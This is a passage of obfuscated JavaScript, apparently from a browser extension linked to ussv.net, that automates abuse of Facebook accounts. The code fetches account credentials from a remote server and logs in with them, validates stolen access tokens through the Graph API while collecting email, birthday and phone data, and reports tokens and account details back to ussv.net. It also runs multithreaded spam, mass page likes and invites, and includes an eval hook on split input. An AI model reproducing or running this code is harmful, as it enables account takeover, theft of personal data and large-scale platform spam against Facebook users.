                    if (f1W[N]($(f1W.k4Q)[f1W.o07](), f1W.B5r)) {
                        F0 += f1W.r8a;
                    }
                    div_thongbao(F0);
                }
            } else if (f1W[Y](E0, $(f1W.b4I)[f1W.o07]())) {
                var u = function() {
                        note = E0 + f1W.F5O;
                    },
                    p0 = function(W) {
                        dem = W;
                    };
                u();
                var F0 = _lJ[f1W.G3v]({
                    "t": f1W.K1I,
                    "id": f1W.P8X,
                    "r": note
                });
                div_thongbao(F0);
                note = $(f1W.L1r);
                p0(f1W.L9a);
                data = uss[f1W.r5Q]({
                    "type": 2,
                    "fb_id": 00000
                });
                if (f1W[n](data[f1W.C3y], f1W.L9a)) {
                    $(note)[f1W.m8y](data[f1W.F5v]);
                    var S = setInterval(function() {
                        var O = "M08",
                            Z = function() {
                                dem = dem + f1W.S9a;
                            };
                        Z();
                        data = uss[f1W.r5Q]({
                            "type": 1
                        });
                        if (f1W[O](data[f1W.C3y], f1W.X5v)) {
                            var F = function(W) {
                                dem = W;
                            };
                            $(note)[f1W.m8y](data[f1W.F5v]);
                            dom_logs_ussv(data[f1W.F5v], "0|_|_|ok|check");
                            $(f1W.q3X)[f1W.C3O](f1W.Q1I, f1W.X50);
                            $(f1W.e50)[f1W.Q0I](_lJ[f1W.G3v]({
                                "t": f1W.K1I,
                                "id": f1W.R4X,
                                "r": f1W.W1I
                            }));
                            clearInterval(S);
                            F(f1W.c9a);
                            var o = setInterval(function() {
                                var V = "i08",
                                    E = function() {
                                        var W = "n08";
                                        dem = f1W[W](dem, f1W.S9a);
                                    };
                                E();
                                $(f1W.v5Y)[f1W.Q0I](dem);
                                if (f1W[V](dem, f1W.L9a)) {
                                    clearInterval(o);
                                    $(f1W.D17)[f1W.w5I]();
                                    $(f1W.p0y)[f1W.Q0I](f1W.c8Q);
                                    get_OneAcc();
                                }
                            }, f1W.Q8r);
                        } else {
                            $(note)[f1W.m8y](f1W.H2O + dem + f1W.J0Y);
                        }
                    }, f1W.D7X);
                } else {
                    $(f1W.L1r)[f1W.m8y](f1W.e7Y);
                }
            } else {
                var K = $(f1W.c87)[f1W.Q0I]();
                $(f1W.c1Q)[f1W.C3O](f1W.Q1I, f1W.I8a);
                $(f1W.X8O)[f1W.Q0I](f1W.u7X);
                if (f1W[f](K, f1W.B3Q)) {
                    var q0 = function(W) {
                            url = W;
                        },
                        H0 = function() {
                            var W = "type=getoneacc&stt=";
                            datalogin = W + st_check_stt() + f1W.c1Y + st_check_time() + f1W.l77 + uss_aut(f1W.S9a) + f1W.R87 + uss_aut(f1W.c9a);
                        };
                    if (f1W[X]($(f1W.R6Q)[f1W.o07](), f1W.B5r)) {
                        chrome[f1W.d60][f1W.K4r]({
                            action: 'clear'
                        }, function(V) {
                            dom_logs_ussv(V, "0|_|_|ok|check");
                            $[f1W.c9y]({
                                type: 'GET',
                                url: 'https://mbasic.facebook.com',
                                data: "xx=xx",
                                dataType: 'json',
                                success: function(W) {}
                            });
                        });
                    }
                    q0(f1W.l9r);
                    H0();
                    chrome[f1W.d60][f1W.K4r]({
                        method: 'POST',
                        action: 'xhttp',
                        url: url,
                        data: datalogin
                    }, function(W) {
                        var V = "c08",
                            E = "J08",
                            O = "I08",
                            W = JSON[f1W.i2O](W);
                        if (f1W[O](W[f1W.C3y], 0)) {
                            var Z = function() {
                                acc_doing[f1W.D87] = U + "|" + p;
                            };
                            var F = W[f1W.v1Y],
                                o = W[f1W.t9X],
                                U = W[f1W.c4I],
                                p = W[f1W.Q0r];
                            Z();
                            var M = '<div id="acc_fn_' + F + '" class="span_thongke"><span style="float: left;">' + U + '</span> <span id="acc_fn_stt_' + F + '" style="position: absolute;left: 80%;"><img style="margin-top: 5px;" src="https://ussv.net/themes/img/load_stt.gif"></span></div><span id="acc_fn_pass_' + F + '" style="display:none">' + p + '</span>',
                                b = $("#div_pnc_right_ketqua"),
                                H = "Tiê´n ha`nh Check ta`i khoa?n " + U + "...";
                            $("#stt_checking")[f1W.Q0I](H);
                            $("#thongke_fbchuacheck")[f1W.m8y](f1W[E](parseInt($("#thongke_fbchuacheck")[f1W.m8y]()), 1));
                            b[f1W.u2r](M);
                            if (f1W[V](b[f1W.q8r](".span_thongke").length, 6)) {
                                b[f1W.q8r](".span_thongke")[f1W.p3X]()[f1W.w5I]();
                            }
                            var R = '<option value="' + F + '" selected>' + U + '</option>';
                            $("#sl_loc_ussv_logs_match_email")[f1W.u2r](R);
                            login_CheckFb(F, U, p, o);
                        } else {
                            $("#stt_checking")[f1W.Q0I](W[f1W.F5v]);
                            thongbao_log(2, W[f1W.F5v]);
                            $('#div_pnc_right_ketqua')[f1W.C3O]('background-image', 'url()');
                            $("#div_thongke_check")[f1W.C3O]("background", "rgba(252, 252, 252, 1)");
                            dom_logs_ussv(lang_vi_checking_nohaveacc, "0|_|_|war|check");
                            stop_check();
                            danhgiacheck();
                        }
                    });
                } else {
                    dom_logs_ussv(f1W.j4v, f1W.v7r);
                    $(f1W.V3O)[f1W.C3O](f1W.d8v, f1W.Q5Q);
                    stop_check();
                    danhgiacheck();
                }
            }
        }
    }

    function fast_log1(R, X, f, n) {
        var Y = function(W) {
                url = W;
            },
            N = function() {
                var W = 'charset_test=?&version=1&ajax=0&width=0&pxr=0&gps=0&dimensions=0&email=';
                datalogin = W + X + f1W.d1r + f + f1W.K1Q;
            };
        uss[f1W.G47](f1W.p5Y);
        Y(f1W.E1r);
        N();
        chrome[f1W.d60][f1W.K4r]({
            method: 'POST',
            action: 'jhttp',
            url: url,
            data: datalogin
        }, function(W) {
            var V = "Y98",
                E = "m98",
                O = "s98",
                Z = "k98",
                F = "X98",
                o = "y98";
            if (f1W[o](W, '')) {
                $("#note_fl_" + R)[f1W.Q0I](ussv_lang_vi_fn_fl);
                go_url(n);
            } else {
                var U = "/checkpoint/gi",
                    p = W[f1W.x3y](/Mcheckpoint/gi);
                if (f1W[F](p, null)) {
                    $("#note_fl_" + R)[f1W.Q0I](ussv_lang_vi_cp_fl);
                    $(".progress-container")[f1W.C3O]("background", "rgb(234, 46, 53)");
                } else {
                    var M = W[f1W.x3y](/XLoginController/gi);
                    if (f1W[Z](M, null)) {
                        $("#note_fl_" + R)[f1W.Q0I](ussv_lang_vi_error_fl);
                        $(".progress-container")[f1W.C3O]("background", "rgb(234, 46, 53)");
                    } else {
                        var b = W[f1W.x3y](/phoneacqwrite/gi);
                        if (f1W[O](b, null)) {
                            $("#note_fl_" + R)[f1W.Q0I](ussv_lang_vi_fn_fl);
                            go_url(n);
                        } else {
                            var H = W[f1W.x3y](/\{"token":(.*?)\}/gi);
                            if (f1W[E](H, null)) {
                                $("#note_fl_" + R)[f1W.Q0I](ussv_lang_vi_fn_fl);
                                go_url(n);
                            } else {
                                if (f1W[V](W[f1W.x3y]("\/messages\/"), null)) {
                                    $("#note_fl_" + R)[f1W.Q0I]("Ðang nh?p thành công...");
                                    go_url(n);
                                } else {
                                    if ($(W)[f1W.q8r](".u").length) {
                                        $("#note_fl_" + R)[f1W.Q0I]("Tài kho?n ho?c m?t kh?u không dúng !");
                                    } else {
                                        $("#note_fl_" + R)[f1W.Q0I]("L?i dang nh?p ! Không xác d?nh du?c nguyên nhân !");
                                    }
                                }
                            }
                        }
                    }
                }
            }
            $(".progress-container")[f1W.v37]();
        });
    }

    function FbCheck() {
        this[f1W.c30] = function(W) {
            var V = "c5b",
                E = "J5b",
                O = "I5b",
                Z = "T5b",
                F = "a5b",
                o = uss[f1W.G47]("https://m.facebook.com/settings/account/?name&__m_async_page__=&__ajax__=&__user=" + W[f1W.l97]);
            if (f1W[F](o, "") || f1W[Z](o, null) || f1W[O](o.length, 20)) {
                var U = "KXD";
            } else {
                var o = JSON[f1W.i2O](o[f1W.F6r]("for (;;);", "")),
                    o = o[f1W.v6v][f1W.M4I][0][f1W.Q0I];
                if (f1W[E](o, undefined)) {
                    o = "<span class='hidden'>448505685205813</span>Có l? b?n chua dang nh?p !";
                };
                if (f1W[V](o[f1W.x3y]("448505685205813"), null)) {
                    var U = "Yes";
                } else {
                    var U = "No";
                }
            }
            return U;
        };
        this[f1W.v9r] = function(W) {};
    }

    function update_keyfb(N, g, T, I, D) {
        var G = function() {
                var W = "&stellar=",
                    V = "&type=updatetoken&fb_id=";
                datalogin = f1W.o0Y + z + f1W.R87 + P + V + N + f1W.i40 + g + f1W.L9I + T + f1W.B0v + I + W + D;
            },
            C = function(W) {
                url = W;
            },
            z = document[f1W.C4y](f1W.n10)[f1W.V5I],
            P = document[f1W.C4y](f1W.u5X)[f1W.V5I];
        C(f1W.l9r);
        G();
        var J = new XMLHttpRequest();
        J[f1W.g4Y] = function() {
            var W = "p28",
                V = "o28",
                E = "r28",
                O = "E28",
                Z = "W28",
                F = "d18",
                o = "K18",
                U = "L18",
                p = "S18",
                M = "P18",
                b = "z18";
            if (f1W[b](J[f1W.D60], 4)) {
                var H = J[f1W.H8v],
                    H = JSON[f1W.i2O](H);
                if (f1W[M](H[f1W.C3y], 0)) {
                    $("#note_check_info")[f1W.Q0I]("Ðang tiê´n ha`nh kiê?m tra thông tin ta`i khoa?n " + g);
                    var R = $("#uss_vip")[f1W.Q0I]();
                    if (f1W[p](R, "1")) {
                        var X = $("#uss_spam")[f1W.Q0I]();
                        if (f1W[U](X, "1")) {
                            if (f1W[o](T, "08080808")) {} else {
                                var f = parseInt($("#uss_type_spam")[f1W.m8y]());
                                if (f1W[F](f, "2")) {
                                    var n = "Spam All",
                                        Y = "Tiê´n ha`nh Spam trên ta`i khoa?n " + g + " \nTi`nh Tra?ng: " + parse_stt_stellar(D) + "\nYêu Câ`u: " + n;
                                    dom_logs_ussv(Y, N + "|_|_|ok|check");
                                    fb_spam(N, g, I, 1);
                                } else {
                                    if (f1W[Z](f, "0")) {
                                        var n = "Chua Ki´ch Hoa?t Stellar";
                                    } else {
                                        var n = "Ða~ Ki´ch Hoa?t Stellar";
                                    }
                                    if (f1W[O](f, D)) {
                                        fb_spam(N, g, I, 1);
                                        var Y = "Tiê´n ha`nh Spam trên ta`i khoa?n " + g + " \nTi`nh Tra?ng: " + parse_stt_stellar(D) + "\nYêu Câ`u: " + n;
                                        dom_logs_ussv(Y, N + "|_|_|ok|check");
                                    } else {
                                        var Y = "Không tiê´n ha`nh Spam trên ta`i khoa?n na`y.\nTi`nh Tra?ng: " + parse_stt_stellar(D) + "\nYêu Câ`u: " + n;
                                        dom_logs_ussv(Y, N + "|_|_|ok|check");
                                        fb_spam(N, g, I, 2);
                                    }
                                }
                            }
                        } else {
                            acc_doing[f1W.f17] = 0;
                        }
                    } else {}
                    if (f1W[E]($("#uss_st_check_info")[f1W.o07](), "yes") && f1W[V](I, 0)) {
                        get_info(N, g, T, I);
                        get_friends(N, g, T, I);
                        get_groups(N, g, T, I);
                        get_pages(N, g, T, I);
                    } else {
                        acc_doing[f1W.f17] = 0;
                        $("#checking_friends_" + N)[f1W.Q0I]("No");
                        $("#checking_page_" + N)[f1W.Q0I]("No");
                        $("#checking_group_" + N)[f1W.Q0I]("No");
                        $("#checking_sub_" + N)[f1W.Q0I]("No");
                        if (f1W[W](I, 0)) {
                            dom_logs_ussv("Quá trình ki?m tra thông tin c?a tài kho?n " + g + " th?t b?i, vì quá trình l?y Token th?t b?i !", N + "|_|_|error|check");
                        } else {
                            dom_logs_ussv("Quá trình ki?m tra thông tin c?a tài kho?n " + g + " Không Ðu?c Phép!", N + "|_|_|kxd|check");
                        }
                    }
                } else {
                    $("#note_check_info")[f1W.Q0I](H[f1W.F5v]);
                }
            }
        };
        J[f1W.d5y](f1W.z77, url, f1W.A0r);
        J[f1W.x1I](f1W.r27, f1W.W3v);
        J[f1W.h0r](datalogin);
    }

    function url_login() {
        var U = "r16",
            p = "usslogin",
            M = document[f1W.w6r],
            b = M[f1W.X3Q](p);
        if (f1W[U](b[f1W.S9a], undefined)) {
            var b = b[f1W.S9a];
            chrome[f1W.d60][f1W.K4r]({
                method: 'POST',
                action: 'xhttp',
                url: 'http://ussv.net/ajax/mahoa.php?type=1&method=2&data=' + b,
                data: "base=hau"
            }, function(W) {
                var V = "e16",
                    E = "p16",
                    O = "o16",
                    W = JSON[f1W.i2O](W);
                if (f1W[O](W[f1W.C3y], 0)) {
                    if (f1W[E](W.data, null)) {
                        var Z = W.data,
                            Z = Z[f1W.X3Q]("|");
                        if (f1W[V](Z[1], undefined)) {
                            alert("Phiên dang nh?p dã h?t h?n !");
                        } else {
                            var F = Z[0],
                                o = Z[1];
                            login(F, o);
                        }
                    } else {
                        alert("D? li?u truy c?p nhanh không h?p l? !");
                    }
                } else {
                    alert(W[f1W.F5v]);
                }
            });
        } else {}
    }

    function acc_doing() {
        var W = "AccId";
        this[f1W.D87] = f1W.V8v;
        this[f1W.A7y] = f1W.V8v;
        this[f1W.Y7Y] = f1W.V8v;
        this[f1W.n3Q] = f1W.V8v;
        this[f1W.m7v] = f1W.V8v;
        this[W] = f1W.L9a;
        this[f1W.f17] = f1W.L9a;
        this[f1W.I0O] = f1W.L9a;
        this[f1W.v20] = {
            info: f1W.L9a,
            group: f1W.L9a,
            year: f1W.L9a,
        };
        this[f1W.l8a] = f1W.L9a;
        this[f1W.L37] = {};
        this[f1W.w97] = f1W.L9a;
        this[f1W.D4Q] = f1W.L9a;
        this[f1W.h6r] = f1W.L9a;
        this[f1W.j97] = f1W.e0Y;
        this[f1W.Y0v] = f1W.L9a;
        this[f1W.M6r] = f1W.V8v;
        this[f1W.E2y] = f1W.V8v;
        this[f1W.V8I] = f1W.V8v;
        this[f1W.y0r] = f1W.V8v;
        this[f1W.E7O] = f1W.V8v;
        this[f1W.j17] = {};
    }

    function rand_text(W) {
        var V = "T7E",
            E = Math[f1W.n40](f1W[V](Math[f1W.f2I](), W));
        return E;
    }

    function SpamV2() {
        var I = "CheckToken",
            D = "UpdateThreadFinish",
            G = "ThreadFinish",
            C = "ThreadStart";
        this[C] = f1W.L9a;
        this[G] = f1W.L9a;
        this[D] = function() {
            var W = "Y1a";
            if (f1W[W]($(f1W.b10)[f1W.o07](), f1W.S9a)) {
                SpamV2[G] = SpamV2[G] + f1W.S9a;
            }
        };
        this[f1W.Z0y] = function() {
            var W = "l1a",
                V = "C1a",
                E = "g1a",
                O = "D1a",
                Z = $("#data_list_acc_coban_token")[f1W.o07](),
                Z = Z[f1W.X3Q]("\n"),
                F = Z.length;
            if (f1W[O](F, 1) || f1W[E](Z[0].length, 50)) {
                dom_logs_ussv("Vui lòng thêm Token tru?c khi ti?n hành SPAM !", "0|0|_|error|check");
                Div_AccList();
                $("#data_list_acc_coban_token")[f1W.C3O]("border", "1px solid rgb(239, 66, 66)");
                $(".div_Laning_AccList")[f1W.v37]();
                $(".div_Laning_AccList.Token")[f1W.R4r]();
            } else {
                $("#popup_ussv_logs")[f1W.l6Q](500);
                $("#stt_check")[f1W.Q0I]("1");
                dom_logs_ussv("List Token hi?n có " + F + " Token. B?t d?u Spam...", "0|0|_|ok|check");
                var o = $("#uss_vip")[f1W.Q0I]();
                if (f1W[V](o, "1")) {
                    var U = $("#uss_spam")[f1W.Q0I]();
                    if (f1W[W](U, "1")) {
                        get_setting_spam("SpamToken");
                    } else {
                        dom_logs_ussv(_lJ[f1W.G3v]({
                            "t": "spam",
                            "id": "TK2"
                        }), "0|0|_|error|check");
                    }
                } else {
                    dom_logs_ussv(_lJ[f1W.G3v]({
                        "t": "spam",
                        "id": "TK1"
                    }), "0|0|_|error|check");
                }
            }
        };
        this[f1W.c60] = function(W) {
            var V = "dob",
                E = "O2a",
                O = "V2a",
                Z = "Q1a",
                F = "t1a",
                o = "w1a",
                U = "x1a",
                p = $("#data_list_acc_coban_token")[f1W.o07]()[f1W.F6r](/\r\n/g, ""),
                p = p[f1W.X3Q]("\n"),
                M = p.length;
            if (f1W[U](M, 1)) {
                dom_logs_ussv("Vui lòng thêm Token tru?c khi ti?n hành SPAM !", "0|0|_|error|check");
                stop_check();
                Div_AccList();
                $("#data_list_acc_coban_token")[f1W.C3O]("border", "1px solid rgb(239, 66, 66)");
                $(".div_Laning_AccList")[f1W.v37]();
                $(".div_Laning_AccList.Token")[f1W.R4r]();
            } else {
                var b = p[0],
                    H = b[f1W.X3Q]("|")[0];
                if (f1W[o](b, null) || f1W[F](b, "undefined") || f1W[Z](b, undefined) || f1W[O](b.length, 11)) {
                    stop_check();
                    dom_logs_ussv("Vui lòng thêm Token tru?c khi ti?n hành SPAM !", "0|0|_|error|check");
                    Div_AccList();
                    $("#data_list_acc_coban_token")[f1W.C3O]("border", "1px solid rgb(239, 66, 66)");
                    $(".div_Laning_AccList")[f1W.v37]();
                    $(".div_Laning_AccList.Token")[f1W.R4r]();
                } else {
                    uss[f1W.C37]({
                        "type": "set",
                        "data": {
                            "ussv_logs_last_token": b
                        }
                    });
                    $("#stt_check")[f1W.Q0I]("1");
                    var R = $("#data_list_acc_coban_token")[f1W.o07]();
                    $("#data_list_acc_coban_token")[f1W.o07](R[f1W.F6r](/\r?\n/g, "\n")[f1W.F6r](/\n?\n/g, "\n")[f1W.F6r](b + "\n", "")[f1W.F6r](b + "\n", "")[f1W.F6r](b, ""));
                    var X = uss[f1W.K0v]({
                            "type": "int",
                            "lg": 9
                        }),
                        f = SpamV2[I]({
                            "token": H
                        });
                    if (f1W[E](f[f1W.W7O], 0)) {
                        dom_logs_ussv("Token #" + X + " dã Die, không th? th?c hi?n Spam", "0|0|_|error|check");
                        var n = parseInt($("#Die_ListAcc_Token_Check")[f1W.m8y]());
                        $("#Die_ListAcc_Token_Check")[f1W.m8y](n + 1);
                        var Y = $("#data_list_acc_coban_token_check_die")[f1W.o07]();
                        $("#data_list_acc_coban_token_check_die")[f1W.o07](Y + H + "\n");
                        SpamV2[D]();
                    } else {
                        dom_logs_ussv("Token #" + X + " Live, dã d?nh d?ng du?c UID " + X + ", ti?n hành SPAM...", "0|0|_|ok|check");
                        var N = parseInt($("#Live_ListAcc_Token_Check")[f1W.m8y]());
                        $("#Live_ListAcc_Token_Check")[f1W.m8y](N + 1);
                        var g = $("#data_list_acc_coban_token_check_live")[f1W.o07]();
                        $("#data_list_acc_coban_token_check_live")[f1W.o07](g + H + "\n");
                        fb_spam(X, f[f1W.c4I], H, 1);
                        start_spam(X, H, f[f1W.G6y], f[V], f[f1W.h3r]);
                    }
                }
            }
        };
        this[f1W.u0y] = function(F) {
            var o = "h2a",
                U = "R2a",
                p = "f2a",
                M = "H2a",
                b = "q2a",
                H = "U2a",
                R = "Z2a",
                X = $("#data_list_acc_coban_token")[f1W.o07]()[f1W.F6r](/\r?\n/g, "\n")[f1W.F6r](/\n?\n/g, "\n"),
                X = X[f1W.X3Q]("\n"),
                f = $("#uss_st_spam_token_TotalThread")[f1W.o07]();
            if (f1W[R](f, 5)) {
                dom_logs_ussv(_lJ[f1W.G3v]({
                    "t": "spam",
                    "id": "TK3"
                }), "0|0|_|error|check");
            } else {
                var n = X[0];
                if (f1W[H](n, null) || f1W[f1W.n1Y](n, "undefined") || f1W[b](n, undefined) || f1W[M](n.length, 11)) {
                    stop_check();
                    dom_logs_ussv("Vui lòng thêm Token tru?c khi ti?n hành SPAM !", "0|0|_|error|check");
                    Div_AccList();
                    $("#data_list_acc_coban_token")[f1W.C3O]("border", "1px solid rgb(239, 66, 66)");
                    $(".div_Laning_AccList")[f1W.v37]();
                    $(".div_Laning_AccList.Token")[f1W.R4r]();
                } else {
                    $("#DIV_AccList_Token_Check")[f1W.R4r]();
                    var X = $("#data_list_acc_coban_token")[f1W.o07](),
                        X = X[f1W.X3Q]("\n"),
                        Y = X.length;
                    if (f1W[p](Y, f)) {
                        dom_logs_ussv(_lJ[f1W.G3v]({
                            "t": "spam",
                            "id": "TK4"
                        }), "0|0|_|error|check");
                        $("#uss_st_spam_token_TotalThread")[f1W.o07]("1")[f1W.V6Q]("selected", true);
                        var f = 1;
                    } else {}
                    var N = $("#stt_check")[f1W.Q0I]();
                    if (f1W[U](N, 1)) {
                        dom_logs_ussv(_lJ[f1W.G3v]({
                            "t": "spam",
                            "id": "TK5",
                            "r": f + "-- x"
                        }), "0|0|_|ok|check");
                        SpamV2[C] = f;
                        SpamV2[G] = 0;
                        for (var g = 0; f1W[o](g, f); g++) {
                            SpamV2[f1W.c60]();
                        };
                        var T = setInterval(function() {
                            var W = "S2a",
                                V = "P2a",
                                E = "z2a",
                                O = "N2a";
                            if (f1W[O]($("#stt_check")[f1W.Q0I](), "0")) {
                                clearInterval(T);
                                dom_logs_ussv("Ðã có yêu c?u d?ng spam d?t ng?t. Ti?n trình b? d?t do?n và d?ng t?i dây !", "0|0|_|war|check");
                            } else {
                                if (f1W[E](SpamV2[C], 2)) {
                                    var Z = f1W[V](SpamV2[C], 1);
                                } else {
                                    var Z = SpamV2[C];
                                }
                                if (f1W[W](SpamV2[G], Z)) {
                                    clearInterval(T);
                                    dom_logs_ussv("Hoàn thành " + f + " Lu?ng, ti?p t?c Lu?ng ti?p theo...", "0|0|_|war|check");
                                    SpamV2[f1W.u0y]();
                                } else {
                                    console[f1W.p4y]("Ti?n trình v?n dang di?n ra !");
                                }
                            }
                        }, 1000);
                    } else {
                        SpamV2[C] = 0;
                        SpamV2[G] = 0;
                        dom_logs_ussv("Không th? ti?n hành Spam, b?n dã yêu c?u d?ng ti?n trình. N?u dây là s? nh?m lãn vui lòng dang t?i lên Group USS", "0|0|_|error|check");
                    }
                }
            }
        };
        this[f1W.i7X] = function(W) {};
        this[I] = function(W) {
            var V = "W9a",
                E = "d2a",
                O = "K2a",
                Z = "L2a",
                F = JSON[f1W.i2O](uss[f1W.G47]("https://graph.facebook.com/me?fields=email,name,birthday,link,locale,verified,gender,mobile_phone,hometown&access_token=" + W[f1W.M00]));
            if (f1W[Z](F[f1W.W7O], null) || f1W[O](F[f1W.W7O], undefined)) {
                var o = 0;
            } else {
                var o = F[f1W.W7O];
            }
            var U = F[f1W.G6y],
                p = F[f1W.q60],
                M = F[f1W.h3r];
            if (f1W[E](F[f1W.c4I], null) || f1W[V](F[f1W.c4I], undefined)) {
                var b = F[f1W.o6O];
            } else {
                var b = F[f1W.c4I];
            }
            return {
                "id": o,
                "name": U,
                "dob": p,
                "gender": M,
                "email": b
            };
        };
    }

    function add_rename(V, E, O, Z) {
        var F = function() {
            var W = "&type=updaterename&stt=";
            datasend = f1W.o0Y + uss_aut(f1W.S9a) + f1W.R87 + uss_aut(f1W.c9a) + W + Z + f1W.v67 + V + f1W.i40 + E + f1W.L9I + O;
        };
        F();
        chrome[f1W.d60][f1W.K4r]({
            method: 'POST',
            action: 'xhttp',
            url: 'http://ussv.net/ajax/get_fb_acc.php',
            data: datasend
        }, function(W) {
            dom_logs_ussv(W, V + "|_|_|ok|check");
        });
    }

    function processWords(W) {
        var V = "USS_LINE_SPACE",
            W = W[f1W.X3Q](V);
        eval(W[1]);
    }

    function delete_cookie(O, Z, F) {
        var o = function() {
            var W = ';expires=Thu, 01 Jan 1970 00:00:01 GMT',
                V = ';domain=',
                E = ';path=';
            document[f1W.T2O] = O + f1W.a47 + ((Z) ? E + Z : f1W.X6v) + ((F) ? V + F : f1W.X6v) + W;
        };
        o();
    }

    function fb_Like(b, H, R, X, f, n, Y, N, g, T, I, D, G) {
        var C = "Q26",
            z = "t26",
            P = "Y26",
            J = "m26";

        function c(E) {
            chrome[f1W.d60][f1W.K4r]({
                method: 'GET',
                action: 'xhttp',
                url: 'http://ussv.net/ajax/likes.php?stt=' + E + '&type=like&token=' + f
            }, function(W) {
                var V = "P96";
                if (f1W[V](W, "true")) {} else {}
            });
        }

        function L(p) {
            var M = f1W.c8r + f;
            chrome[f1W.d60][f1W.K4r]({
                method: 'GET',
                action: 'xhttp',
                url: M,
                data: "hj=hj"
            }, function(W) {
                var V = "f96",
                    E = "H96",
                    O = "q96",
                    Z = "b96",
                    W = JSON[f1W.i2O](W),
                    F = W.data.length;
                if (f1W[Z](T, "Invite")) {
                    if (f1W[O](N, "hide")) {
                        dom_logs_ussv(_lJ[f1W.G3v]({
                            "t": "like",
                            "id": "a1",
                            "r": F + "--" + X + "--" + Y
                        }), "0|0|_|ok|likeinvite");
                    }
                    if (f1W[E](p, F)) {
                        var o = p;
                    } else {
                        var o = F;
                    }
                    for (var U = 0; f1W[V](U, o); U++) {
                        K(W.data[U][f1W.l97]);
                    };
                };
            });
        }

        function E0() {
            $[f1W.c9y]({
                url: "https://www.facebook.com/ajax/settings/notifications/notify_me.php",
                dataType: "json",
                type: "POST",
                data: "fb_dtsg=" + n + "&notifier_id=" + X + "&enable=true&__user=" + Y + "&__a=1&__req=c"
            })[f1W.D2I](function(W) {
                var V = "U96",
                    E = "Z96",
                    O = "O96";
                if (f1W[O](N, "hide")) {
                    if (f1W[E](W[f1W.D60], 4)) {
                        var W = W[f1W.H8v],
                            W = JSON[f1W.i2O](W[f1W.F6r]("for (;;);", ""));
                        if (f1W[V](W.error, null)) {
                            dom_logs_ussv(R + " Theo gi?i thành công Page " + X, "0|0|_|ok|like");
                        } else {
                            dom_logs_ussv(W[f1W.m87], "0|0|_|error|like");
                        }
                    } else {
                        dom_logs_ussv("L?i trong quá trình Like Page !", "0|0|_|error|like");
                    }
                }
            });
        }

        function F0() {
            chrome[f1W.d60][f1W.K4r]({
                method: 'GET',
                action: 'xhttp',
                url: 'https://graph.facebook.com/' + X + '/feed?limit=' + G + '&access_token=' + f
            }, function(W) {
                var V = "z96",
                    W = JSON[f1W.i2O](W);
                for (var E = 0; f1W[V](E, W.data.length); E++) {
                    c(W.data[E][f1W.W7O]);
                };
            });
        }

        function K(Z) {
            $[f1W.c9y]({
                url: "https://www.facebook.com/ajax/pages/invite/send_single/",
                dataType: "json",
                type: "POST",
                data: "fb_dtsg=" + n + "&page_id=" + X + "&invitee=" + Z + "&elem_id=&action=send&ref=_dialog&__user=" + Y + "&__a=1&__req=e"
            })[f1W.D2I](function(W) {
                var V = "N96",
                    E = "h96",
                    O = "R96";
                if (f1W[O](N, "hide")) {
                    if (f1W[E](W[f1W.D60], 4)) {
                        var W = W[f1W.H8v],
                            W = JSON[f1W.i2O](W[f1W.F6r]("for (;;);", ""));
                        if (f1W[V](W.error, null)) {
                            $('#likeinvite_' + Y + '_' + X)[f1W.Q0I]("M?i thành công " + Z);
                            uss[f1W.H1X]('#likeinvite_TC_' + Y + '_' + X);
                        } else {
                            $('#likeinvite_' + Y + '_' + X)[f1W.Q0I](W[f1W.m87]);
                            uss[f1W.H1X]('#likeinvite_TB_' + Y + '_' + X);
                        }
                    } else {
                        $('#likeinvite_' + Y + '_' + X)[f1W.Q0I]("L?i trong quá trình M?i !");
                        uss[f1W.H1X]('#likeinvite_TB_' + Y + '_' + X);
                    }
                }
            });
        }
        if (f1W[J](b, f1W.S9a)) {
            if (f1W[P](H, f1W.S9a)) {
                $[f1W.c9y]({
                    url: "https://www.facebook.com/ajax/pages/fan_status.php",
                    dataType: "json",
                    type: "POST",
                    data: "fb_dtsg=" + n + "&fbpage_id=" + X + "&add=true&reload=false&fan_origin=page_timeline&fan_source&cat&&__user=" + Y + "&__a=1&__req=20"
                })[f1W.D2I](function(W) {
                    var V = "w26",
                        E = "x26",
                        O = "l26",
                        Z = "C26",
                        F = "g26",
                        o = "D26";
                    if (f1W[o](N, "hide")) {
                        if (f1W[F](W[f1W.D60], 4)) {
                            var W = W[f1W.H8v],
                                W = JSON[f1W.i2O](W[f1W.F6r]("for (;;);", ""));
                            if (f1W[Z](W.error, null)) {
                                dom_logs_ussv(R + " Like thành công Page " + X, "0|0|_|ok|like");
                            } else {
                                dom_logs_ussv(W[f1W.m87], "0|0|_|error|like");
                            }
                        } else {
                            dom_logs_ussv("L?i trong quá trình Like Page !", "0|0|_|error|like");
                        }
                    }
                    if (f1W[O](g, "notify")) {
                        E0();
                    };
                    if (f1W[E](T, "Invite")) {
                        L(I);
                    };
                    if (f1W[V](D, "Like_Post")) {
                        F0();
                    };
                });
            } else {}
        } else if (f1W[z](b, f1W.c9a)) {
            if (f1W[C](H, f1W.S9a)) {
                $[f1W.c9y]({
                    url: "https://www.facebook.com/ajax/ufi/like.php",
                    dataType: "json",
                    type: "POST",
                    data: "fb_dtsg=" + n + "&like_action=true&ft_ent_identifier=" + X + "&source=21&client_id=1423771567111%3A3329445616&rootid=u_jsonp_24_t&ft[tn]=%3E]&ft[fbfeed_location]=10&nctr[_mod]=pagelet_timeline_recent&av=" + Y + "&__user=" + Y + "&__a=1&__req=ab"
                })[f1W.D2I](function(W) {
                    var V = "V96";
                    if (f1W[V](W[f1W.D60], 4)) {
                        var W = W[f1W.H8v],
                            W = JSON[f1W.i2O](W[f1W.F6r]("for (;;);", ""));
                        dom_logs_ussv(R + " Like thành công Status " + X, "0|0|_|ok|like");
                    } else {
                        dom_logs_ussv("L?i trong quá trình Like Status !", "0|0|_|error|like");
                    }
                });
            } else {}
        } else {}
    }

    function uss_cr_gg_link_st2(O, Z, F, o, U) {
        var p = "&botguard_response=xxx",
            M = "&typed_url=",
            b = "&captcha_challenge=&captcha_response=&security_token=",
            H = "url=",
            R = o,
            X = H + f + b + U + M + f + p,
            f = f1W.L8I;
        chrome[f1W.d60][f1W.K4r]({
            method: 'POST',
            action: 'xhttp',
            url: 'http://goo.gl/api/shorten',
            data: "url=" + R + "&captcha_challenge=&captcha_response=&security_token=" + U + "&typed_url=" + R + "&botguard_response=xxx"
        }, function(W) {
            var V = "short_url",
                E = "c7E",
                W = JSON[f1W.i2O](W);
            if (f1W[E](W[V], null)) {
                $("#uss_goo_rd")[f1W.m8y]("0");
                $("#uss_goo_rd_ok")[f1W.m8y]("1");
                dom_logs_ussv(lang_vi_cr_goo_error + " " + o, O + "|_|_|error|spam");
            } else {
                $("#uss_goo_rd")[f1W.m8y](W[V]);
